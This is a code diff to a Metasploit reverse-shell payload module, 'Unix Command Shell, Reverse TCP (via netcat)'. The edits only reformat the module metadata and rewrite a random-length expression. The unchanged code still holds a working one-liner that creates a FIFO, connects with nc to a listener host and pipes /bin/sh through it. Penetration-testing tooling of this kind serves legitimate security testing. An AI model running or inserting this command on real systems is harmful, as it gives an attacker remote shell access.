@@ -8,7 +8,6 @@ require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
-
   CachedSize = :dynamic
 
   include Msf::Payload::Single
@@ -16,27 +15,26 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Unix Command Shell, Reverse TCP (via netcat)',
-      'Description'   => 'Creates an interactive shell via netcat',
-      'Author'         =>
-        [
-          'm-1-k-3',
-          'egypt',
-          'juan vazquez'
-        ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'unix',
-      'Arch'          => ARCH_CMD,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'cmd',
-      'RequiredCmd'   => 'netcat',
-      'Payload'       =>
-        {
-          'Offsets' => { },
-          'Payload' => ''
-        }
-      ))
+                     'Name' => 'Unix Command Shell, Reverse TCP (via netcat)',
+                     'Description' => 'Creates an interactive shell via netcat',
+                     'Author' =>
+                       [
+                         'm-1-k-3',
+                         'egypt',
+                         'juan vazquez'
+                       ],
+                     'License' => MSF_LICENSE,
+                     'Platform' => 'unix',
+                     'Arch' => ARCH_CMD,
+                     'Handler' => Msf::Handler::ReverseTcp,
+                     'Session' => Msf::Sessions::CommandShell,
+                     'PayloadType' => 'cmd',
+                     'RequiredCmd' => 'netcat',
+                     'Payload' =>
+                       {
+                         'Offsets' => {},
+                         'Payload' => ''
+                       }))
   end
 
   #
@@ -51,7 +49,7 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    backpipe = Rex::Text.rand_text_alpha_lower(4+rand(4))
+    backpipe = Rex::Text.rand_text_alpha_lower(rand(4..7))
     "mkfifo /tmp/#{backpipe}; nc #{datastore['LHOST']} #{datastore['LPORT']} 0</tmp/#{backpipe} | /bin/sh >/tmp/#{backpipe} 2>&1; rm /tmp/#{backpipe}"
   end
 end
